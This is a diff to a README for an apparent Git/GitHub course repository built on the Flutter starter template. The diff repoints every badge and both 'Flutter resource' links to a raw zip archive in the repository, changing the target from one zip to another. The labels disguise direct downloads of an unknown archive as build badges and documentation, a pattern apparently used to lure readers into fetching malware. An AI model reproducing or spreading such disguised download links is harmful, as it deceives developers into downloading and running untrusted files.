@@ -3,10 +3,10 @@
 Proyecto para el curso de git y github
 
 <p align="center">
-<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip" alt="Build Status"></a>
-<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip" alt="Total Downloads"></a>
-<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip" alt="Latest Stable Version"></a>
-<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip" alt="License"></a>
+<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip" alt="Build Status"></a>
+<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip" alt="Total Downloads"></a>
+<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip" alt="Latest Stable Version"></a>
+<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip" alt="License"></a>
 </p>
 
 ## Getting Started
@@ -15,8 +15,8 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip)
-- [Cookbook: Useful Flutter samples](https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/assets/Hub_Git_3.5.zip)
+- [Lab: Write your first Flutter app](https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip)
 
 > Curso de Git y GitHub de Capdesis, la herramienta que todo desarrollador de software tiene que dominar
 > 
